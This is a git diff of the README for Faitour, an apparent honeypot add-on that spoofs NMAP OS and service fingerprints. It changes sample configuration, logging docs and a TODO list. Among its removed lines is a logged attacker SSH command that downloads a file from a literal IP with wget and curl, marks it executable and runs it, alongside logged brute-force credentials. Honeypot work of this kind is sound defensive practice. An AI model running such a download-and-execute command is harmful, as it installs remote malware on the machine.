@@ -8,7 +8,7 @@ n. Archaic
 
 Faitour was cloned from [eightus/Cyder](https://github.com/eightus/Cyder), so I must first give credit to that project. Although that project is no longer maintained, you can still reference it for the original version.
 
-Faitour has been stripped down to simply the OS emulation capabilities, and I have tried to simplify installation on Ubuntu 22.04. There is a ton of code clean-up that can still be done, but this was intended to be a quick and simple compliment to OpenCanary to more closely emulate different operating systems for NMAP fingerprinting.
+Faitour has been stripped down to simply the OS emulation capabilities, and I have tried to simplify installation on Ubuntu 22.04. This was intended to be a quick and simple compliment to OpenCanary to more closely emulate different operating systems for NMAP fingerprinting.
 
 Cyder was originally a Honeypot that was designed to imitate any Operating System (OS) that is available in the NMAP database. What remains in Faitour is the ability to detect NMAP probes and reply with spoofed OS and service fingerprints.
 
@@ -70,35 +70,35 @@ _IMPORTANT!_ As with all configurations, including the sample configurations pro
 
 ```
 [CONFIGURATION]
-logging = localhost
-# IMPORTANT! Change "interface" to match your interface name
+# Set network details to match your host
 interface = eth0
-log_path = /var/log/faitour
-debug = true
-
-[HOST]
-# IMPORTANT! Change "ip" to match your device's IP address
 ip = 10.10.10.10
 mac_address = false
-http = false
-ssh = false
-telnet = false
-file_system = ./configuration/fs/default_fs.json
+mac = 00:11:22:33:44:55
 
+[LOGGING]
+# DEBUG, INFO, WARNING, ERROR
+logLevel = DEBUG
+logDir = /var/log/faitour/
+logSize = 10000000
+logCount = 10
+logPackets = True
+
+[HOST]
 # Windows Server 2012 R2 Emulation
-fingerprint = SEQ(SP=FE-108%GCD=1-6%ISR=103-10D%TI=I|RD%II=I%SS=S%TS=A|C)
-    OPS(O1=M5B4NW8ST11%O2=M5B4NW8ST11%O3=M5B4NW8NNT11%O4=M5B4NW8ST11%O5=M5B4NW8ST11%O6=M5B4ST11)
-    WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
-    ECN(R=Y%DF=Y%T=7B-85%TG=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)
-    T1(R=Y%DF=Y%T=7B-85%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
-    T2(R=N)
-    T3(R=N)
-    T4(R=N)
-    T5(R=Y%DF=Y%T=7B-85%TG=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
-    T6(R=N)
-    T7(R=N)
-    U1(DF=N%T=7B-85%TG=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
-    IE(DFI=N%T=7B-85%TG=80%CD=Z)
+fingerprint = SEQ(SP=F7-101%GCD=1-6%ISR=FD-107%TI=I%CI=I%II=I%SS=O%TS=7)
+	OPS(O1=M5B4NW8ST11%O2=M5B4NW8ST11%O3=M5B4NW8NNT11%O4=M5B4NW8ST11%O5=M5B4NW8ST11%O6=M5B4ST11)
+	WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
+	ECN(R=Y%DF=Y%T=7B-85%TG=80%W=2000%O=M5B4NW8NNS%CC=Y%Q=)
+	T1(R=Y%DF=Y%T=7B-85%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
+	T2(R=Y%DF=Y%T=7B-85%TG=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
+	T3(R=N)
+	T4(R=Y%DF=Y%T=7B-85%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
+	T5(R=Y%DF=Y%T=7B-85%TG=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+	T6(R=Y%DF=Y%T=7B-85%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
+	T7(R=Y%DF=Y%T=7B-85%TG=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+	U1(DF=N%T=7B-85%TG=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
+	IE(DFI=N%T=7B-85%TG=80%CD=Z)
 
 # Microsoft SMB Emulation
 139 = \x83\0\0\x01\x8f$
@@ -106,13 +106,6 @@ fingerprint = SEQ(SP=FE-108%GCD=1-6%ISR=103-10D%TI=I|RD%II=I%SS=S%TS=A|C)
 
 # Windows RPC Emulation
 135 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
-1025 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
-1026 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
-1027 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
-1028 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
-1113 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
-1169 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
-2701 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
 
 # Microsoft RDP
 3389 = \x03\0\0*%\xe0\0\0\0\0\0
@@ -147,16 +140,11 @@ Be sure to run an NMAP scan from another machine to ensure that everything is wo
 
 ## Logging
 
-Logs are stored in `/var/log/faitour` by default. All logs are in `json` format.
+Logs are stored in `/var/log/faitour` by default, but the path may be modified in `host_config.ini`. Logging it written to both stdout (systemd journal) and text file. Optionally enable packet logging in `host_config.ini`.
 
-**faitour.json**
+**faitour**
 
-- Contains credentials and commands that are attempted through SSH / Telnet / HTTP
-- Example of Logs:
-- `{"timestamp": 1577716279.8859844, "protocol": "SSH", "username": "root", "password": "admin", "dst_ip": "x.x.x.x", "dst_port": 22, "src_ip": "x.x.x.x", "src_port": 52772}`
-- `{"timestamp": 1577682398.527439, "protocol": "SSH", "command": "#!/bin/sh\nPATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nwget http://23.228.113.117/21\ncurl -O http://x.x.x.x/21\nchmod +x 21\n./21\n", "dst_ip": "x.x.x.x", "dst_port": 22, "src_ip": "x.x.x.x", "src_port": 50433}`
-- `{"timestamp": 1577682701.8840919, "protocol": "Telnet", "username": "admin", "password": "", "src_ip": "x.x.x.x", "dst_ip": "x.x.x.x", "src_port": 56380}`
-- Timestamp is in epoch time format.
+- Log core application events.
 
 **packet.json**
 
@@ -167,10 +155,6 @@ Logs are stored in `/var/log/faitour` by default. All logs are in `json` format.
 - `base64.decodebytes(packet.encode('ascii'))`
 - This will return you the actual bytes.
 - `services` is the port number.
-
-**debug.json**
-
-- Self-explanatory
 
 ## Limitations and Known Issues
 
@@ -190,7 +174,8 @@ If you would like to contribute to this project, including code changes or confi
 ## TODO
 
 * [x] Operating System Spoofing
-* [ ] Code Clean Up of Cyder's Honeypot Functionality
+* [X] Code Clean Up of Cyder's Honeypot Functionality
+* [X] Enahnce logging
 * [ ] Create additional sample configurations for OS/Service configurations
 
 ## Credits
